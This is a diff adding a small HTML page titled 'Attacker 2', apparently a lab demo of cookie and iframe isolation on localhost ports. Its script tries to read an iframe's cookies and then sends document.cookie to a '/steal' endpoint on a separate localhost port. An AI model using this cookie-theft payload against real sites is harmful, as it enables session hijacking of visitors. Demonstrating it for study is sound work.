@@ -1,0 +1,29 @@
+<!DOCTYPE HTML>
+<html>
+<h1>Attacker 2</h1>
+<body>
+Below is an iframe that loads from a page that is in another path
+<p>
+<p>
+
+<script>
+    document.cookie = 'foo=defend'
+    const iframe = document.createElement('iframe')
+    iframe.src= 'http://localhost:4003/'
+    document.body.appendChild(iframe)
+    document.write(iframe.contentDocument.cookie)
+    console.log(iframe.contentDocument.cookie)
+
+    
+    setTimeout(function() {
+    const p = document.createElement('p')
+    p.innerHTML = document.cookie
+    document.body.appendChild(p)
+    
+   
+     new Image().src = 'http://localhost:4004/steal?cookie=' + document.cookie
+    }, 5000);
+</script>
+
+</body>
+</html>
